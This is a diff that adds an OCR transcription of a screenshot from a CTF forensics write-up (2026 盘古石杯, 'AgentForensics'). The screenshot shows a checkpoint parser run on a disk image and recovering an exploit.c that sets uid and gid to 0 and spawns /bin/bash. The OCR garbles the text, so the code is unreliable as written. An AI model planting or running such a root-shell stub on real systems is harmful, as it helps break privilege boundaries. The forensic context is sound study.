@@ -1,0 +1,11 @@
+# OCR: QQ_1778563635817.webp
+# 来源: ./02-WriteUp/2026/2026-盘古石杯-初赛/QQ_1778563635817.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:49
+
+NoahTieoArkD/F/AgentForensics
+>python.1checkpoint_parser.pyC:/hlnetl5-1778389242\PC.E01l分区2\homelkalil.hermeslcheck points--cate9671acd244849c5exploit.c
+#include<stdio.h>#include<stdlib,h>#include<unistd,h>
+intmainO
+setuid(o); setgid(o);
+system("/bin/bash"); returne;
